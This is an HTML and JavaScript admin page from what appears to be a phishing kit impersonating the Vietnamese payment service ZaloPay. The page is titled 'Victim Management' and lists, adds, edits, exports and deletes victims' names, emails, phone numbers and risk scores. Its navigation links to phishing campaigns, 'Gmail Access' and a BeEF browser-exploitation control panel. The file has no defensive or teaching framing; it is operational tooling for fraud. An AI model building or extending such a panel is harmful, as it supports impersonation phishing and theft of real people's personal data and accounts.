<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victim Management - ZaloPay Admin</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <!-- DataTables CSS -->
    <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    
    <!-- Custom CSS -->
    <link href="/css/admin.css" rel="stylesheet">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand d-flex align-items-center" href="/admin/dashboard.html">
                <img src="/images/zalopay-logo.png" alt="ZaloPay" height="32" class="me-2">
                <span class="fw-bold">ZaloPay Admin</span>
            </a>
            
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="/admin/dashboard.html">
                            <i class="fas fa-tachometer-alt me-1"></i>Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="/admin/victims.html">
                            <i class="fas fa-users me-1"></i>Victims
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/admin/campaigns.html">
                            <i class="fas fa-bullhorn me-1"></i>Campaigns
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/admin/gmail.html">
                            <i class="fas fa-envelope me-1"></i>Gmail Access
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/admin/beef.html">
                            <i class="fas fa-bug me-1"></i>BeEF Control
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/admin/logs.html">
                            <i class="fas fa-list-alt me-1"></i>Activity Logs
                        </a>
                    </li>
                </ul>
                
                <ul class="navbar-nav">
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-bs-toggle="dropdown">
                            <i class="fas fa-user-circle me-1"></i>
                            <span id="userName">Admin User</span>
                        </a>
                        <ul class="dropdown-menu dropdown-menu-end">
                            <li><a class="dropdown-item" href="/admin/profile.html">
                                <i class="fas fa-user me-2"></i>Profile
                            </a></li>
                            <li><a class="dropdown-item" href="/admin/settings.html">
                                <i class="fas fa-cog me-2"></i>Settings
                            </a></li>
                            <li><hr class="dropdown-divider"></li>
                            <li><a class="dropdown-item" href="#" onclick="logout()">
                                <i class="fas fa-sign-out-alt me-2"></i>Logout
                            </a></li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <div class="container-fluid py-4">
        <!-- Page Header -->
        <div class="row mb-4">
            <div class="col-12">
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <h1 class="h3 mb-1">Victim Management</h1>
                        <p class="text-muted mb-0">Quản lý và theo dõi thông tin nạn nhân</p>
                    </div>
                    <div class="d-flex gap-2">
                        <button class="btn btn-outline-primary" onclick="refreshVictims()">
                            <i class="fas fa-sync-alt me-1"></i>Refresh
                        </button>
                        <button class="btn btn-outline-success" onclick="exportVictims()">
                            <i class="fas fa-download me-1"></i>Export
                        </button>
                        <button class="btn btn-primary" onclick="addVictim()">
                            <i class="fas fa-plus me-1"></i>Add Victim
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Filters -->
        <div class="row mb-4">
            <div class="col-12">
                <div class="card border-0 shadow-sm">
                    <div class="card-body">
                        <div class="row g-3">
                            <div class="col-md-3">
                                <label for="searchInput" class="form-label">Search</label>
                                <input type="text" class="form-control" id="searchInput" placeholder="Search victims...">
                            </div>
                            <div class="col-md-2">
                                <label for="statusFilter" class="form-label">Status</label>
                                <select class="form-select" id="statusFilter">
                                    <option value="">All Status</option>
                                    <option value="active">Active</option>
                                    <option value="inactive">Inactive</option>
                                    <option value="deleted">Deleted</option>
                                </select>
                            </div>
                            <div class="col-md-2">
                                <label for="riskFilter" class="form-label">Risk Level</label>
                                <select class="form-select" id="riskFilter">
                                    <option value="">All Risk Levels</option>
                                    <option value="low">Low</option>
                                    <option value="medium">Medium</option>
                                    <option value="high">High</option>
                                    <option value="critical">Critical</option>
                                </select>
                            </div>
                            <div class="col-md-2">
                                <label for="verificationFilter" class="form-label">Verification</label>
                                <select class="form-select" id="verificationFilter">
                                    <option value="">All</option>
                                    <option value="verified">Verified</option>
                                    <option value="unverified">Unverified</option>
                                    <option value="pending">Pending</option>
                                </select>
                            </div>
                            <div class="col-md-3">
                                <label for="dateRange" class="form-label">Date Range</label>
                                <input type="text" class="form-control" id="dateRange" placeholder="Select date range">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Victims Table -->
        <div class="row">
            <div class="col-12">
                <div class="card border-0 shadow-sm">
                    <div class="card-body">
                        <div class="table-responsive">
                            <table id="victimsTable" class="table table-hover">
                                <thead>
                                    <tr>
                                        <th>
                                            <input type="checkbox" class="form-check-input" id="selectAll">
                                        </th>
                                        <th>ID</th>
                                        <th>Name</th>
                                        <th>Email</th>
                                        <th>Phone</th>
                                        <th>Status</th>
                                        <th>Risk Score</th>
                                        <th>Verification</th>
                                        <th>Created</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <!-- Data will be loaded here -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Victim Detail Modal -->
    <div class="modal fade" id="victimDetailModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Victim Details</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div id="victimDetailContent">
                        <!-- Content will be loaded here -->
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" onclick="editVictim()">Edit</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Add/Edit Victim Modal -->
    <div class="modal fade" id="victimFormModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="victimFormTitle">Add Victim</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form id="victimForm">
                        <div class="row g-3">
                            <div class="col-md-6">
                                <label for="victimId" class="form-label">Victim ID</label>
                                <input type="text" class="form-control" id="victimId" readonly>
                            </div>
                            <div class="col-md-6">
                                <label for="victimStatus" class="form-label">Status</label>
                                <select class="form-select" id="victimStatus">
                                    <option value="active">Active</option>
                                    <option value="inactive">Inactive</option>
                                    <option value="deleted">Deleted</option>
                                </select>
                            </div>
                            <div class="col-md-6">
                                <label for="victimEmail" class="form-label">Email *</label>
                                <input type="email" class="form-control" id="victimEmail" required>
                            </div>
                            <div class="col-md-6">
                                <label for="victimPhone" class="form-label">Phone</label>
                                <input type="tel" class="form-control" id="victimPhone">
                            </div>
                            <div class="col-md-6">
                                <label for="victimFirstName" class="form-label">First Name</label>
                                <input type="text" class="form-control" id="victimFirstName">
                            </div>
                            <div class="col-md-6">
                                <label for="victimLastName" class="form-label">Last Name</label>
                                <input type="text" class="form-control" id="victimLastName">
                            </div>
                            <div class="col-md-6">
                                <label for="victimRiskScore" class="form-label">Risk Score</label>
                                <input type="number" class="form-control" id="victimRiskScore" min="0" max="100">
                            </div>
                            <div class="col-md-6">
                                <label for="victimVerification" class="form-label">Verification Status</label>
                                <select class="form-select" id="victimVerification">
                                    <option value="unverified">Unverified</option>
                                    <option value="verified">Verified</option>
                                    <option value="pending">Pending</option>
                                </select>
                            </div>
                            <div class="col-12">
                                <label for="victimNotes" class="form-label">Notes</label>
                                <textarea class="form-control" id="victimNotes" rows="3"></textarea>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" onclick="saveVictim()">Save</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    
    <!-- DataTables JS -->
    <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>
    
    <!-- Custom JS -->
    <script src="/js/admin.js"></script>
    <script src="/js/victim-management.js"></script>
    
    <script>
        // Initialize victims page
        document.addEventListener('DOMContentLoaded', function() {
            initializeVictimsPage();
        });

        function initializeVictimsPage() {
            initializeVictimsTable();
            initializeFilters();
        }

        function initializeVictimsTable() {
            $('#victimsTable').DataTable({
                processing: true,
                serverSide: true,
                ajax: {
                    url: '/api/admin/victims/',
                    type: 'GET',
                    data: function(d) {
                        d.status = $('#statusFilter').val();
                        d.risk_level = $('#riskFilter').val();
                        d.verification_status = $('#verificationFilter').val();
                        d.search = $('#searchInput').val();
                    }
                },
                columns: [
                    {
                        data: null,
                        orderable: false,
                        searchable: false,
                        render: function(data, type, row) {
                            return `<input type="checkbox" class="form-check-input victim-checkbox" value="${row.victim_id}">`;
                        }
                    },
                    { data: 'victim_id' },
                    { 
                        data: 'personal_info.full_name',
                        render: function(data, type, row) {
                            return data || 'N/A';
                        }
                    },
                    { data: 'email' },
                    { data: 'phone' },
                    {
                        data: 'status',
                        render: function(data, type, row) {
                            const statusClass = {
                                'active': 'success',
                                'inactive': 'warning',
                                'deleted': 'danger'
                            }[data] || 'secondary';
                            return `<span class="badge bg-${statusClass}">${data}</span>`;
                        }
                    },
                    {
                        data: 'risk_score',
                        render: function(data, type, row) {
                            const riskClass = data >= 80 ? 'danger' : data >= 60 ? 'warning' : 'success';
                            return `<span class="badge bg-${riskClass}">${data}</span>`;
                        }
                    },
                    {
                        data: 'verification_status',
                        render: function(data, type, row) {
                            const statusClass = {
                                'verified': 'success',
                                'unverified': 'secondary',
                                'pending': 'warning'
                            }[data] || 'secondary';
                            return `<span class="badge bg-${statusClass}">${data}</span>`;
                        }
                    },
                    {
                        data: 'created_at',
                        render: function(data, type, row) {
                            return new Date(data).toLocaleDateString();
                        }
                    },
                    {
                        data: null,
                        orderable: false,
                        searchable: false,
                        render: function(data, type, row) {
                            return `
                                <div class="btn-group btn-group-sm">
                                    <button class="btn btn-outline-primary" onclick="viewVictim('${row.victim_id}')">
                                        <i class="fas fa-eye"></i>
                                    </button>
                                    <button class="btn btn-outline-warning" onclick="editVictim('${row.victim_id}')">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                    <button class="btn btn-outline-danger" onclick="deleteVictim('${row.victim_id}')">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </div>
                            `;
                        }
                    }
                ],
                order: [[8, 'desc']],
                pageLength: 25,
                responsive: true
            });
        }

        function initializeFilters() {
            // Search input
            $('#searchInput').on('keyup', function() {
                $('#victimsTable').DataTable().draw();
            });

            // Filter selects
            $('#statusFilter, #riskFilter, #verificationFilter').on('change', function() {
                $('#victimsTable').DataTable().draw();
            });

            // Select all checkbox
            $('#selectAll').on('change', function() {
                $('.victim-checkbox').prop('checked', this.checked);
            });
        }

        function refreshVictims() {
            $('#victimsTable').DataTable().ajax.reload();
            showNotification('Victims table refreshed', 'success');
        }

        function exportVictims() {
            const selectedVictims = $('.victim-checkbox:checked').map(function() {
                return this.value;
            }).get();

            const exportData = {
                victim_ids: selectedVictims.length > 0 ? selectedVictims : null,
                format: 'csv',
                include_sensitive_data: false
            };

            fetch('/api/admin/victims/export', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(exportData)
            })
            .then(response => response.blob())
            .then(blob => {
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'victims_export.csv';
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                showNotification('Victims exported successfully', 'success');
            })
            .catch(error => {
                console.error('Export error:', error);
                showNotification('Export failed', 'error');
            });
        }

        function addVictim() {
            $('#victimFormTitle').text('Add Victim');
            $('#victimForm')[0].reset();
            $('#victimId').val('AUTO_GENERATED');
            $('#victimFormModal').modal('show');
        }

        function viewVictim(victimId) {
            fetch(`/api/admin/victims/${victimId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        displayVictimDetails(data.victim);
                        $('#victimDetailModal').modal('show');
                    }
                })
                .catch(error => {
                    console.error('Error loading victim details:', error);
                    showNotification('Failed to load victim details', 'error');
                });
        }

        function editVictim(victimId) {
            if (victimId) {
                fetch(`/api/admin/victims/${victimId}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            populateVictimForm(data.victim);
                            $('#victimFormTitle').text('Edit Victim');
                            $('#victimFormModal').modal('show');
                        }
                    })
                    .catch(error => {
                        console.error('Error loading victim for edit:', error);
                        showNotification('Failed to load victim data', 'error');
                    });
            } else {
                $('#victimFormTitle').text('Edit Victim');
                $('#victimFormModal').modal('show');
            }
        }

        function deleteVictim(victimId) {
            if (confirm('Are you sure you want to delete this victim?')) {
                fetch(`/api/admin/victims/${victimId}`, {
                    method: 'DELETE'
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showNotification('Victim deleted successfully', 'success');
                        $('#victimsTable').DataTable().ajax.reload();
                    } else {
                        showNotification('Failed to delete victim', 'error');
                    }
                })
                .catch(error => {
                    console.error('Delete error:', error);
                    showNotification('Delete failed', 'error');
                });
            }
        }

        function saveVictim() {
            const formData = {
                victim_id: $('#victimId').val(),
                email: $('#victimEmail').val(),
                phone: $('#victimPhone').val(),
                status: $('#victimStatus').val(),
                risk_score: parseInt($('#victimRiskScore').val()) || 0,
                verification_status: $('#victimVerification').val(),
                personal_info: {
                    full_name: `${$('#victimFirstName').val()} ${$('#victimLastName').val()}`.trim()
                }
            };

            const isEdit = $('#victimFormTitle').text().includes('Edit');
            const url = isEdit ? `/api/admin/victims/${formData.victim_id}` : '/api/admin/victims/';
            const method = isEdit ? 'PUT' : 'POST';

            fetch(url, {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification('Victim saved successfully', 'success');
                    $('#victimFormModal').modal('hide');
                    $('#victimsTable').DataTable().ajax.reload();
                } else {
                    showNotification('Failed to save victim', 'error');
                }
            })
            .catch(error => {
                console.error('Save error:', error);
                showNotification('Save failed', 'error');
            });
        }

        function displayVictimDetails(victim) {
            const content = `
                <div class="row">
                    <div class="col-md-6">
                        <h6>Basic Information</h6>
                        <table class="table table-sm">
                            <tr><td><strong>ID:</strong></td><td>${victim.victim_id}</td></tr>
                            <tr><td><strong>Email:</strong></td><td>${victim.email}</td></tr>
                            <tr><td><strong>Phone:</strong></td><td>${victim.phone || 'N/A'}</td></tr>
                            <tr><td><strong>Name:</strong></td><td>${victim.personal_info?.full_name || 'N/A'}</td></tr>
                            <tr><td><strong>Status:</strong></td><td><span class="badge bg-${victim.status === 'active' ? 'success' : 'warning'}">${victim.status}</span></td></tr>
                        </table>
                    </div>
                    <div class="col-md-6">
                        <h6>Risk Assessment</h6>
                        <table class="table table-sm">
                            <tr><td><strong>Risk Score:</strong></td><td><span class="badge bg-${victim.risk_score >= 80 ? 'danger' : victim.risk_score >= 60 ? 'warning' : 'success'}">${victim.risk_score}</span></td></tr>
                            <tr><td><strong>Verification:</strong></td><td><span class="badge bg-${victim.verification_status === 'verified' ? 'success' : 'secondary'}">${victim.verification_status}</span></td></tr>
                            <tr><td><strong>Created:</strong></td><td>${new Date(victim.created_at).toLocaleString()}</td></tr>
                            <tr><td><strong>Last Activity:</strong></td><td>${new Date(victim.last_activity).toLocaleString()}</td></tr>
                        </table>
                    </div>
                </div>
            `;
            document.getElementById('victimDetailContent').innerHTML = content;
        }

        function populateVictimForm(victim) {
            $('#victimId').val(victim.victim_id);
            $('#victimEmail').val(victim.email);
            $('#victimPhone').val(victim.phone);
            $('#victimStatus').val(victim.status);
            $('#victimRiskScore').val(victim.risk_score);
            $('#victimVerification').val(victim.verification_status);
            
            if (victim.personal_info?.full_name) {
                const nameParts = victim.personal_info.full_name.split(' ');
                $('#victimFirstName').val(nameParts[0] || '');
                $('#victimLastName').val(nameParts.slice(1).join(' ') || '');
            }
        }

        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
            notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
            notification.innerHTML = `
                ${message}
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
            }, 5000);
        }

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                localStorage.removeItem('admin_token');
                localStorage.removeItem('admin_user');
                window.location.href = '/admin/login.html';
            }
        }
    </script>
</body>
</html>
